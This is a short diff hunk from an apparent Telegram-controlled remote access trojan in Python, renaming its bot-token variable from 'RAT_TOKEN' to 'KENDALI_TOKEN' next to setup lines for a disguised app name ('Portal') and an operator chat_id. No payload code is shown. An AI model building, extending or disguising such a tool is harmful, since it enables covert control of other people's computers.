@@ -32,7 +32,7 @@ import urllib# wallpaper
 me = singleton.SingleInstance()
 # REPLACE THE LINE BELOW WITH THE TOKEN OF THE BOT YOU GENERATED!
 #token = 'nnnnnnnnn:lllllllllllllllllllllllllllllllllll'
-token = os.environ['RAT_TOKEN'] 						# you can set your environment variable as well
+token = os.environ['KENDALI_TOKEN'] 						# you can set your environment variable as well
 # This will be used for setting paths and related file io -- change to whatever you want
 app_name = 'Portal'
 # ADD YOUR chat_id TO THE LIST BELOW IF YOU WANT YOUR BOT TO ONLY RESPOND TO ONE PERSON!
